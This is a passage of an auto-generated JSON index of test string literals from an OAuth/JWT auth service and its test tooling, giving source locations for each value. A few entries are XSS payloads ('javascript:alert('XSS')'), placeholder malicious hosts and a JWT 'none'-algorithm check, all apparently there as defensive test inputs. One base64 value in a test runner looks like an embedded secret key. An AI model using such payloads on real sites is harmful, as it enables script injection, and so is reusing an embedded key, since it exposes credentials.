        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:123",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:85"
      ]
    },
    "https://github.com": {
      "value": "https://github.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:160"
      ]
    },
    "https://login.microsoftonline.com": {
      "value": "https://login.microsoftonline.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:161"
      ]
    },
    "https://malicious-provider.com": {
      "value": "https://malicious-provider.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:93"
      ]
    },
    "https://malicious-site.com": {
      "value": "https://malicious-site.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1078",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1079",
        "auth_service/tests/test_security.py:365"
      ]
    },
    "https://other-provider.com": {
      "value": "https://other-provider.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:175"
      ]
    },
    "https://staging.netra.ai/auth/callback": {
      "value": "https://staging.netra.ai/auth/callback",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:197"
      ]
    },
    "https://staging.netra.systems": {
      "value": "https://staging.netra.systems",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:147"
      ]
    },
    "httpx": {
      "value": "httpx",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:56"
      ]
    },
    "httpx.AsyncClient": {
      "value": "httpx.AsyncClient",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:222",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:418",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:468",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:559",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:599",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:640",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:692",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:749",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:782",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:806"
      ]
    },
    "httpx.AsyncClient.get": {
      "value": "httpx.AsyncClient.get",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:135"
      ]
    },
    "httpx.AsyncClient.post": {
      "value": "httpx.AsyncClient.post",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:129",
        "auth_service/tests/auth-service-down-critical-scenarios.py:313",
        "auth_service/tests/auth-service-down-critical-scenarios.py:388",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:128",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:290",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:529"
      ]
    },
    "hybrid": {
      "value": "hybrid",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:841",
        "scripts/unified_test_runner.py:842"
      ]
    },
    "iZAG-Kz661gRuJXEGzxgghUFnFRamgDrjDXZE6HdJkw=": {
      "value": "iZAG-Kz661gRuJXEGzxgghUFnFRamgDrjDXZE6HdJkw=",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:212"
      ]
    },
    "iat": {
      "value": "iat",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:169",
        "auth_service/tests/base/test_mixins.py:276",
        "auth_service/tests/factories/token_factory.py:40",
        "auth_service/tests/factories/token_factory.py:134",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:522",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1486",
        "auth_service/tests/test_auth_token_generation.py:87",
        "auth_service/tests/test_auth_token_generation.py:115",
        "auth_service/tests/test_auth_token_generation.py:164",
        "auth_service/tests/test_auth_token_generation.py:198"
      ]
    },
    "id": {
      "value": "id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:85",
        "auth_service/tests/base/test_base.py:91",
        "auth_service/tests/base/test_base.py:97",
        "auth_service/tests/base/test_base.py:103",
        "auth_service/tests/base/test_base.py:131",
        "auth_service/tests/base/test_base.py:137",
        "auth_service/tests/base/test_base.py:146",
        "auth_service/tests/base/test_base.py:153",
        "auth_service/tests/base/test_mixins.py:140",
        "auth_service/tests/base/test_mixins.py:196"
      ]
    },
    "id_token": {
      "value": "id_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:198",
        "auth_service/tests/integration/test_auth_oauth_errors.py:47",
        "auth_service/tests/integration/test_auth_oauth_google.py:56",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:429",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:479",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:532",
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:28",
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:47"
      ]
    },
    "identified_bottlenecks": {
      "value": "identified_bottlenecks",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:252",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:255",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:262",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:281"
      ]
    },
    "ignored - shutdown took": {
      "value": "ignored - shutdown took",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:83"
      ]
    },
    "immediate_fixes": {
      "value": "immediate_fixes",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:193",
        "scripts/compliance/real_test_linter.py:195",
        "scripts/compliance/test_fixer.py:349",
        "scripts/compliance/test_fixer.py:357"
      ]
    },
    "impact_analysis": {
      "value": "impact_analysis",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:254",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:265"
      ]
    },
    "impact_level": {
      "value": "impact_level",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:345"
      ]
    },
    "impact_multiplier": {
      "value": "impact_multiplier",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:27",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:34",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:41",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:48",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:185"
      ]
    },
    "import": {
      "value": "import",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:127",
        "scripts/align_test_imports.py:128",
        "scripts/align_test_imports.py:140",
        "scripts/align_test_imports.py:141",
        "scripts/align_test_imports.py:169",
        "scripts/auto_fix_test_violations.py:579",
        "scripts/auto_fix_test_violations.py:585",
        "scripts/compliance/test_fixer.py:191",
        "scripts/comprehensive_test_fixer.py:265",
        "scripts/fix_all_test_issues.py:44"
      ]
    },
    "import (": {
      "value": "import (",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_errors.py:163"
      ]
    },
    "import *": {
      "value": "import *",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:113",
        "scripts/fix_all_test_issues.py:198"
      ]
    },
    "import app\\.": {
      "value": "import app\\.",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:195"
      ]
    },
    "import netra_backend": {
      "value": "import netra_backend",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:158",
        "scripts/fix_test_import_order.py:34"
      ]
    },
    "import netra_backend.app.": {
      "value": "import netra_backend.app.",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:195"
      ]
    },
    "import pytest": {
      "value": "import pytest",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:335",
        "scripts/compliance/test_fixer.py:335"
      ]
    },
    "import pytest\\n": {
      "value": "import pytest\\n",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:246"
      ]
    },
    "import sys": {
      "value": "import sys",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:177"
      ]
    },
    "import tests.e2e.auth_flow_testers": {
      "value": "import tests.e2e.auth_flow_testers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:88"
      ]
    },
    "import tests.e2e.config": {
      "value": "import tests.e2e.config",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:87"
      ]
    },
    "import tests.e2e.jwt_token_helpers": {
      "value": "import tests.e2e.jwt_token_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:85"
      ]
    },
    "import tests.e2e.oauth_test_providers": {
      "value": "import tests.e2e.oauth_test_providers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:86"
      ]
    },
    "import tests\\.config": {
      "value": "import tests\\.config",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:87"
      ]
    },
    "import tests\\.e2e\\.auth_flow_testers": {
      "value": "import tests\\.e2e\\.auth_flow_testers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:88"
      ]
    },
    "import tests\\.jwt_token_helpers": {
      "value": "import tests\\.jwt_token_helpers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:85"
      ]
    },
    "import tests\\.oauth_test_providers": {
      "value": "import tests\\.oauth_test_providers",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:86"
      ]
    },
    "import unittest": {
      "value": "import unittest",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:242",
        "scripts/fix_test_import_errors.py:243"
      ]
    },
    "import unittest\\\\n": {
      "value": "import unittest\\\\n",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:246"
      ]
    },
    "import\\s+(.+)": {
      "value": "import\\s+(.+)",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:70"
      ]
    },
    "import_correction": {
      "value": "import_correction",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:310"
      ]
    },
    "import_errors": {
      "value": "import_errors",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:114"
      ]
    },
    "import_fixes": {
      "value": "import_fixes",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:405"
      ]
    },
    "import_similarity": {
      "value": "import_similarity",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:632"
      ]
    },
    "imports": {
      "value": "imports",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:104"
      ]
    },
    "in": {
      "value": "in",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:619",
        "scripts/compliance/real_test_linter.py:178",
        "scripts/compliance/test_fixer.py:260",
        "scripts/compliance/test_size_validator.py:432",
        "scripts/comprehensive_test_fixer.py:401",
        "scripts/fix_test_batch.py:204",
        "scripts/fix_test_batch.py:211"
      ]
    },
    "inactive123": {
      "value": "inactive123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:130"
      ]
    },
    "inactive_sessions_cleaned": {
      "value": "inactive_sessions_cleaned",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:295"
      ]
    },
    "include": {
      "value": "include",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:28"
      ]
    },
    "include_router": {
      "value": "include_router",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:232"
      ]
    },
    "incorrect_password": {
      "value": "incorrect_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:88"
      ]
    },
    "indicators": {
      "value": "indicators",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:89",
        "netra_backend/app/services/realistic_test_data/models.py:94",
        "netra_backend/app/services/realistic_test_data/models.py:99",
        "netra_backend/app/services/realistic_test_data/models.py:104"
      ]
    },
    "inf": {
      "value": "inf",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:370"
      ]
    },
    "info": {
      "value": "info",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:23"
      ]
    },
    "infrastructure_costs_usd": {
      "value": "infrastructure_costs_usd",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:239"
      ]
    },
    "infrastructure_plumbing": {
      "value": "infrastructure_plumbing",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:426"
      ]
    },
    "init": {
      "value": "init",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:640"
      ]
    },
    "initialization\"\"\"\n        # TODO: Test class instantiation\n        pass": {
      "value": "initialization\"\"\"\n        # TODO: Test class instantiation\n        pass",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:201"
      ]
    },
    "initialize": {
      "value": "initialize",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_single_database.py:32"
      ]
    },
    "input": {
      "value": "input",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:45",
        "netra_backend/app/services/realistic_test_data/models.py:34",
        "netra_backend/app/services/realistic_test_data/models.py:44",
        "netra_backend/app/services/realistic_test_data/models.py:54",
        "netra_backend/app/services/realistic_test_data/models.py:64",
        "netra_backend/app/services/realistic_test_data/models.py:74",
        "scripts/real_service_test_metrics.py:33",
        "scripts/real_service_test_metrics.py:34",
        "scripts/real_service_test_metrics.py:35",
        "scripts/real_service_test_metrics.py:36"
      ]
    },
    "inputs": {
      "value": "inputs",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:188"
      ]
    },
    "insecure jwt algorithm: none": {
      "value": "insecure jwt algorithm: none",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:197"
      ]
    },
    "install": {
      "value": "install",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:139",
        "scripts/test_frontend.py:52"
      ]
    },
    "instances failed": {
      "value": "instances failed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_graceful_shutdown_failures.py:461"
      ]
    },
    "instead of": {
      "value": "instead of",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:191"
      ]
    },
    "insufficient_scope": {
      "value": "insufficient_scope",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:253"
      ]
    },
    "integration": {
      "value": "integration",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:214",
        "scripts/add_test_markers.py:54",
        "scripts/auto_fix_test_sizes.py:346",
        "scripts/auto_fix_test_sizes.py:347",
        "scripts/auto_fix_test_sizes.py:633",
        "scripts/auto_fix_test_violations.py:487",
        "scripts/auto_fix_test_violations.py:488",
        "scripts/automated_test_fix_loop.py:17",
        "scripts/autonomous_review/test_reviewer.py:214",
        "scripts/autonomous_review/test_reviewer.py:225"
      ]
    },
    "integration_tests": {
      "value": "integration_tests",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:59",
        "scripts/compliance/project_test_validator.py:64",
        "scripts/fix_test_syntax_errors.py:228",
        "scripts/test_backend.py:203"
      ]
    },
    "internal overlaps. Consider reorganizing tests or extracting common test utilities.": {
      "value": "internal overlaps. Consider reorganizing tests or extracting common test utilities.",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:459"
      ]
    },
    "internal_overlaps": {
      "value": "internal_overlaps",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:409",
        "scripts/analyze_test_overlap.py:457",
        "scripts/analyze_test_overlap.py:459",
        "scripts/analyze_test_overlap.py:553",
        "scripts/analyze_test_overlap.py:564"
      ]
    },
    "into": {
      "value": "into",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:831",
        "scripts/fix_all_test_issues.py:203"
      ]
    },
    "invalid": {
      "value": "invalid",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:383",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1059",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1137",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:125",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:344",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:369",
        "auth_service/tests/test_database_connection_validation.py:180",
        "auth_service/tests/test_database_manager.py:260",
        "auth_service/tests/test_graceful_shutdown_failures.py:349",
        "auth_service/tests/test_graceful_shutdown_failures.py:349"
      ]
    },
    "invalid syntax": {
      "value": "invalid syntax",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:236"
      ]
    },
    "invalid user pattern": {
      "value": "invalid user pattern",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:265"
      ]
    },
    "invalid!@#base64": {
      "value": "invalid!@#base64",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:108"
      ]
    },
    "invalid-client-id": {
      "value": "invalid-client-id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:251"
      ]
    },
    "invalid-email": {
      "value": "invalid-email",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:398",
        "auth_service/tests/unit/test_oauth_models.py:78"
      ]
    },
    "invalid-token-format": {
      "value": "invalid-token-format",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:117"
      ]
    },
    "invalid.jwt.token": {
      "value": "invalid.jwt.token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/token_factory.py:149",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:991"
      ]
    },
    "invalid.token": {
      "value": "invalid.token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1009",
        "auth_service/tests/test_auth_token_security.py:72",
        "auth_service/tests/test_oauth_id_token_validation.py:122",
        "auth_service/tests/test_security.py:585",
        "auth_service/tests/unified/test_jwt_validation.py:363"
      ]
    },
    "invalid.token.format": {
      "value": "invalid.token.format",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:123"
      ]
    },
    "invalid.token.here": {
      "value": "invalid.token.here",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_security.py:393"
      ]
    },
    "invalid==base64": {
      "value": "invalid==base64",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:98"
      ]
    },
    "invalid_base64.token.here": {
      "value": "invalid_base64.token.here",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:110"
      ]
    },
    "invalid_challenge": {
      "value": "invalid_challenge",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:82"
      ]
    },
    "invalid_challenge_value": {
      "value": "invalid_challenge_value",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:50"
      ]
    },
    "invalid_code": {
      "value": "invalid_code",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:213"
      ]
    },
    "invalid_combination": {
      "value": "invalid_combination",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:104"
      ]
    },
    "invalid_grant": {
      "value": "invalid_grant",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:170"
      ]
    },
    "invalid_hash": {
      "value": "invalid_hash",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:171"
      ]
    },
    "invalid_header.": {
      "value": "invalid_header.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:126"
      ]
    },
    "invalid_request": {
      "value": "invalid_request",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:396",
        "auth_service/tests/integration/test_auth_oauth_google.py:187"
      ]
    },
    "invalid_run_id": {
      "value": "invalid_run_id",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:148"
      ]
    },
    "invalid_state": {
      "value": "invalid_state",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:86"
      ]
    },
    "invalid_token": {
      "value": "invalid_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:248",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1035",
        "scripts/test_verify_workflow_status.py:111",
        "scripts/test_verify_workflow_status.py:113",
        "scripts/test_verify_workflow_status_corrected.py:126",
        "scripts/test_verify_workflow_status_corrected.py:128"
      ]
    },
    "invalid_url": {
      "value": "invalid_url",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:190"
      ]
    },
    "invalid_user_pattern": {
      "value": "invalid_user_pattern",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:355"
      ]
    },
    "invalid_wait": {
      "value": "invalid_wait",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:95"
      ]
    },
    "io_bound": {
      "value": "io_bound",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:79"
      ]
    },
    "ios_": {
      "value": "ios_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:83"
      ]
    },
    "ip_address": {
      "value": "ip_address",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:54",
        "auth_service/tests/factories/session_factory.py:35",
        "auth_service/tests/test_session_management.py:338",
        "auth_service/tests/test_session_management.py:347"
      ]
    },
    "is already failing!": {
      "value": "is already failing!",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:742"
      ]
    },
    "is_active": {
      "value": "is_active",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:41",
        "auth_service/tests/factories/user_factory.py:41",
        "auth_service/tests/utils/assertion_helpers.py:92",
        "auth_service/tests/utils/assertion_helpers.py:100",
        "auth_service/tests/utils/assertion_helpers.py:111",
        "auth_service/tests/utils/assertion_helpers.py:119",
        "auth_service/tests/utils/test_client.py:246",
        "auth_service/tests/utils/test_client.py:303",
        "auth_service/tests/utils/test_helpers.py:118"
      ]
    },
    "is_active must be boolean": {
      "value": "is_active must be boolean",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:101",
        "auth_service/tests/utils/assertion_helpers.py:120"
      ]
    },
    "is_cloud_sql_environment": {
      "value": "is_cloud_sql_environment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:152",
        "auth_service/tests/test_auth_database_manager_missing_method.py:155",
        "auth_service/tests/test_auth_database_manager_missing_method.py:369"
      ]
    },
    "is_cloud_sql_environment must be callable": {
      "value": "is_cloud_sql_environment must be callable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:156"
      ]
    },
    "is_cloud_sql_environment should be callable": {
      "value": "is_cloud_sql_environment should be callable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:372"
      ]
    },
    "is_cloud_sql_environment should return boolean": {
      "value": "is_cloud_sql_environment should return boolean",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:296"
      ]
    },
    "is_cloud_sql_environment should return boolean, got:": {
      "value": "is_cloud_sql_environment should return boolean, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:169",
        "auth_service/tests/test_auth_database_manager_missing_method.py:184"
      ]
    },
    "is_test_environment": {
      "value": "is_test_environment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:195",
        "auth_service/tests/test_auth_database_manager_missing_method.py:198",
        "auth_service/tests/test_auth_database_manager_missing_method.py:370",
        "auth_service/tests/test_postgres_compliance.py:220"
      ]
    },
    "is_test_environment must be callable": {
      "value": "is_test_environment must be callable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:199"
      ]
    },
    "is_test_environment should be callable": {
      "value": "is_test_environment should be callable",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:373"
      ]
    },
    "is_test_environment should return boolean": {
      "value": "is_test_environment should return boolean",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:297"
      ]
    },
    "is_test_environment should return boolean, got:": {
      "value": "is_test_environment should return boolean, got:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:212",
        "auth_service/tests/test_auth_database_manager_missing_method.py:227",
        "auth_service/tests/test_auth_database_manager_missing_method.py:251",
        "auth_service/tests/test_auth_database_manager_missing_method.py:270"
      ]
    },
    "is_test_mode": {
      "value": "is_test_mode",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_authentication_failures.py:125",
        "auth_service/tests/test_database_authentication_failures.py:156",
        "auth_service/tests/test_database_authentication_failures.py:267",
        "auth_service/tests/test_database_authentication_failures.py:382",
        "auth_service/tests/test_database_connection_validation.py:54",
        "auth_service/tests/test_database_connection_validation.py:91",
        "auth_service/tests/test_database_connection_validation.py:166",
        "auth_service/tests/test_database_connection_validation.py:278"
      ]
    },
    "is_verified": {
      "value": "is_verified",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/user_factory.py:42"
      ]
    },
    "is_weekend": {
      "value": "is_weekend",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:123"
      ]
    },
    "isolated": {
      "value": "isolated",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:200"
      ]
    },
    "isolation": {
      "value": "isolation",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:107"
      ]
    },
    "iss": {
      "value": "iss",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1488",
        "auth_service/tests/test_auth_token_generation.py:86",
        "auth_service/tests/test_auth_token_generation.py:114",
        "auth_service/tests/test_auth_token_generation.py:163",
        "auth_service/tests/test_auth_token_generation.py:227",
        "auth_service/tests/test_auth_token_generation.py:228",
        "auth_service/tests/test_auth_token_security.py:56",
        "auth_service/tests/test_auth_token_security.py:90",
        "auth_service/tests/test_auth_token_security.py:218",
        "auth_service/tests/test_auth_token_security.py:237"
      ]
    },
    "issue": {
      "value": "issue",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:159",
        "scripts/test_workflows_with_act.py:295",
        "scripts/test_workflows_with_act.py:340"
      ]
    },
    "issuer": {
      "value": "issuer",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:78"
      ]
    },
    "issues": {
      "value": "issues",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:263",
        "scripts/test_workflows_with_act.py:359"
      ]
    },
    "it(": {
      "value": "it(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:156"
      ]
    },
    "it\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]": {
      "value": "it\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:419"
      ]
    },
    "items)": {
      "value": "items)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:142"
      ]
    },
    "iteration": {
      "value": "iteration",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:79",
        "scripts/iterative_test_fix_loop.py:94"
      ]
    },
    "iteration test-fix loop": {
      "value": "iteration test-fix loop",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:142"
      ]
    },
    "iterations": {
      "value": "iterations",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:141"
      ]
    },
    "iterations!": {
      "value": "iterations!",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:150"
      ]
    },
    "javascript:": {
      "value": "javascript:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:267",
        "auth_service/tests/test_security.py:306",
        "auth_service/tests/test_security.py:322"
      ]
    },
    "javascript:alert('XSS')": {
      "value": "javascript:alert('XSS')",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:92"
      ]
    },
    "javascript:alert('attack')": {
      "value": "javascript:alert('attack')",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:698"
      ]
    },
    "jest": {
      "value": "jest",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:70",
        "scripts/cleanup_test_processes.py:129",
        "scripts/test_frontend.py:72",
        "scripts/test_frontend.py:100",
        "scripts/test_frontend.py:100",
        "scripts/unified_test_config.py:183"
      ]
    },
    "jest mocks (jest.fn:": {
      "value": "jest mocks (jest.fn:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:401"
      ]
    },
    "jest.config.*": {
      "value": "jest.config.*",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:89"
      ]
    },
